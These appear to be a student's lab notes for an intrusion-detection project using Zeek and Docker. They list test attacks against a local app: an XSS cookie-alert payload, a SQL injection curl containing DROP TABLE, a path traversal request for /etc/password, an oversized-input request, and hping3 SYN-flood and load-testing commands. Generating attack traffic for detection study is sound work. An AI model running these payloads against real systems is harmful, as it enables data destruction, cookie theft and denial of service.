# NOTES:

* https://research.cec.sc.edu/files/cyberinfra/files/Zeek_Lab_Series.pdf

* Get docker container ip:
    docker ps
    docker inspect -f '{{range.NetworkSettings.Networks}}{{.IPAddress}}{{end}}' 49b976aca826

* connect to mysql:
    mariadb -h 172.21.0.2 -u ids_project_2024 -p --skip-ssl

* Get docker container cpu usage / io etc:
    docker container stats container_id or docker stats (its an alias)
    docker container top container_id

# NON AUTOMATED TOOLS

1) Cross Site Scripting (XSS):
<!-- <img src="" onerror="alert(document.cookie);"> -->

----------------------------------------

2) SQL Injection:
    - https://go.dev/doc/database/sql-injection
<!-- Safe: _, err := db.Exec("INSERT INTO Posts (title, content) VALUES (?, ?)", post.Title, post.Content) -->
<!-- Unsafe: payload := fmt.Sprintf("INSERT INTO Posts (title, content) VALUES ('%s', '%s')", post.Title, post.Content) \ _, err = db.Exec(payload) -->

<!-- test1 -->
<!-- test2'); DROP TABLE Posts; -- this is a comment and shall be ignored -->

curl -H 'Content-Type: application/json' -d "{\"title\":\"test1\",\"content\":\"test2'); DROP TABLE Posts; -- this is a comment and shall be ignored\"}" -X POST localhost:1234

----------------------------------------

3) NGINX Path Traversal Vulnerability

curl http://localhost/api/etc/password

----------------------------------------

4) curl -H "Content-Type: application/json" -d '{"title":"hello world", "content":"'$(python -c 'print("A"*5050)' | sed 's/"/\\"/g')'"}' -X POST http://localhost:1234

----------------------------------------

5) 

----------------------------------------

# AUTOMATED TOOLS

> see: ./ddos.sh

1. sudo hping3 -i u40 -S -p 1234 -c 1000000 172.21.0.3
2. Apache Bench ab -n 100000 -c 100 http://localhost:1234/
3. https://github.com/hatoo/oha oha -z 2m -c 1000 http://localhost:1234
4. nmap
